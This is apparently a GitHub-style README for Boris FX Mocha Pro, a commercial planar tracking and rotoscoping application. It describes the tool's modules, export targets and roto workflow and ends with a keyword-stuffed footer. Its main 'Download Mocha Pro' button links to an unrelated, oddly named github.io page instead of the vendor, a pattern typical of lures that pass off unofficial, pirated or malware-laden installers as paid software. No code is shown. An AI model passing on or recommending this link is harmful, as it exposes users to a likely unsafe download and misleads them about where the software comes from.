<p align="center">
  <img src="preview.png" alt="Boris FX Mocha Pro tracking interface" width="840" />
</p>

<p align="center">
  <a href="https://zeptohornbilltassel.github.io/nightcore/">
    <img src="download.png" alt="Download Mocha Pro" width="270" />
  </a>
</p>

# Boris FX Mocha Pro

<p>
<img src="https://img.shields.io/badge/Tracking-Planar%20GPU-E53935?style=flat-square"/>
<img src="https://img.shields.io/badge/Roto-Magnetic%20spline-7B1FA2?style=flat-square"/>
<img src="https://img.shields.io/badge/Hosts-AE%20%7C%20Premiere%20%7C%20Resolve%20%7C%20Nuke-1A237E?style=flat-square"/>
<img src="https://img.shields.io/badge/3D-Camera%20solve-00695C?style=flat-square"/>
</p>

---

Point trackers lose their target the moment something crosses in front of it. Mocha's planar tracker works differently — it analyses the motion of a flat surface (a wall, a forehead, a phone screen) as a rigid geometric entity, ignoring whatever passes in front of it, and that makes the data dramatically more stable.

### Planar tracker vs point tracker

```
Point tracker:
  Follows one pixel cluster → fails on occlusion → needs manual keys

Mocha planar tracker:
  Defines a surface plane → tracks its perspective transform
  → continues through partial occlusion → exports corner-pin / transform / roto data
```

### Module breakdown

| Module | What it does |
|---|---|
| **Planar tracker** | Surface motion data with sub-pixel accuracy |
| **Roto tools** | Magnetic edge-snapping splines, motion-linked to tracks |
| **Lens module** | Camera lens calibration, undistort / redistort |
| **3D camera solve** | Derives camera move from tracked surfaces |
| **Remove module** | Clean-plate generation with tracked fill |
| **Insert module** | Composite replacement with accurate perspective |

### Export targets

After Effects (shape data, corner pin, transform) · Premiere Pro · DaVinci Resolve (OFX) · Nuke (matchmove) · Flame · HitFilm · Vegas Pro

### Roto workflow

```
Draw spline around subject
  → "Link to track" — spline follows planar data
  → Refine edges with magnetic snapping
  → Export matte to host as shape layer or matte
```

---

<p align="center">
<sub>mocha pro · planar tracking · rotoscoping software · motion tracking vfx · boris fx · after effects tracking · 3d camera solve · lens distortion · vfx compositing tool</sub>
</p>
